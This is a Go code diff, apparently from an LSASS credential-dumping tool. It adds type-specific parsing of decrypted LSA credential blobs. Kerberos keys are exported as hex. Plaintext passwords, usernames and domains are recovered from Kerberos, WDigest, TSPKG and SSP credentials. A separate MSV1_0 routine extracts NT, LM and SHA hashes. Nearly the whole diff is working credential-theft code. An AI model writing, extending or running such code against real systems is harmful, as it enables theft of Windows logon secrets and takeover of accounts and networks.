@@ -88,29 +88,84 @@ func captureLsaCrypto(r lsassReader, lsasrvBytes []byte, lsasrvBase uintptr, lay
 }
 
 // decryptCredentialBlob runs Phase 2C-ii-c against a single captured
-// ciphertext blob.
-func decryptCredentialBlob(material lsaCryptoMaterial, ciphertext []byte, outerUserName string) (*insituFullDecryptedReport, string) {
+// ciphertext blob. credentialName is the ANSI string from the PRIMARY_CREDENTIALS
+// envelope's Primary field (e.g. "Primary", "Kerberos-Newer-Keys", "WDigest").
+// encryptedAddr is the LSASS-virtual address of the encrypted blob, used to
+// resolve inline string pointers in Kerberos/WDigest/TSPKG credentials.
+func decryptCredentialBlob(material lsaCryptoMaterial, ciphertext []byte, outerUserName string,
+	credentialName string, encryptedAddr uintptr) (*insituFullDecryptedReport, string) {
 	plaintext, alg, err := decryptLsaProtectedMemory(ciphertext, material.AESKey, material.DESKey, material.IV)
 	if err != nil {
-		report := &insituFullDecryptedReport{Algorithm: string(alg)}
+		report := &insituFullDecryptedReport{Algorithm: string(alg), CredentialName: credentialName}
 		report.ParseErr = err.Error()
 		return report, ""
 	}
+
+	report := &insituFullDecryptedReport{
+		Algorithm:      string(alg),
+		PlaintextLength: len(plaintext),
+		CredentialName: credentialName,
+	}
+
+	switch credentialName {
+	case "Kerberos-Newer-Keys":
+		kc := parseKerberosNewerKeys(plaintext, encryptedAddr)
+		for _, k := range kc.Keys {
+			report.KerberosKeys = append(report.KerberosKeys, insituFullKerbKeyReport{
+				EncType: k.EncType.String(),
+				KeyHex:  hex.EncodeToString(k.KeyBytes),
+			})
+		}
+		if kc.Password != "" {
+			report.PlaintextPassword = kc.Password
+		}
+		if len(kc.ParseErrors) > 0 {
+			report.ParseErr = strings.Join(kc.ParseErrors, "; ")
+		}
+		return report, ""
+
+	case "Kerberos":
+		kc := parseKerberosOld(plaintext, encryptedAddr)
+		if kc.Password != "" {
+			report.PlaintextPassword = kc.Password
+		}
+		if len(kc.ParseErrors) > 0 {
+			report.ParseErr = strings.Join(kc.ParseErrors, "; ")
+		}
+		return report, ""
+
+	case "WDigest", "TSPKG", "SSP":
+		pc := parsePlaintextCredential(plaintext, encryptedAddr)
+		report.PlaintextUser = pc.UserName
+		report.PlaintextDomain = pc.Domain
+		if pc.Password != "" {
+			report.PlaintextPassword = pc.Password
+		}
+		if len(pc.ParseErrors) > 0 {
+			report.ParseErr = strings.Join(pc.ParseErrors, "; ")
+		}
+		return report, ""
+
+	default:
+		return decryptMSV10Blob(plaintext, alg, outerUserName, report)
+	}
+}
+
+// decryptMSV10Blob handles the MSV1_0 "Primary" / "CredentialKeys" credential
+// format — NT/LM/SHA hash extraction.
+func decryptMSV10Blob(plaintext []byte, alg LsaDecryptAlg, outerUserName string,
+	report *insituFullDecryptedReport) (*insituFullDecryptedReport, string) {
 	layout := detectPrimaryCredentialLayout(plaintext)
 	parsed, perr := parsePrimaryCredential10(plaintext, layout)
-	report := &insituFullDecryptedReport{
-		Algorithm:               string(alg),
-		PlaintextLength:         len(plaintext),
-		Layout:                  parsed.Layout,
-		IsIso:                   parsed.IsIso,
-		IsNtOwfPassword:         parsed.IsNtOwfPassword,
-		IsLmOwfPassword:         parsed.IsLmOwfPassword,
-		IsShaOwPassword:         parsed.IsShaOwPassword,
-		HeaderUserNameLength:    parsed.UserNameHeaderLength,
-		HeaderUserNameMaxLen:    parsed.UserNameHeaderMaxLen,
-		HeaderLogonDomainLength: parsed.LogonDomainHeaderLength,
-		HeaderLogonDomainMaxLen: parsed.LogonDomainHeaderMaxLen,
-	}
+	report.Layout = parsed.Layout
+	report.IsIso = parsed.IsIso
+	report.IsNtOwfPassword = parsed.IsNtOwfPassword
+	report.IsLmOwfPassword = parsed.IsLmOwfPassword
+	report.IsShaOwPassword = parsed.IsShaOwPassword
+	report.HeaderUserNameLength = parsed.UserNameHeaderLength
+	report.HeaderUserNameMaxLen = parsed.UserNameHeaderMaxLen
+	report.HeaderLogonDomainLength = parsed.LogonDomainHeaderLength
+	report.HeaderLogonDomainMaxLen = parsed.LogonDomainHeaderMaxLen
 	if perr != nil {
 		report.ParseErr = perr.Error()
 		return report, ""
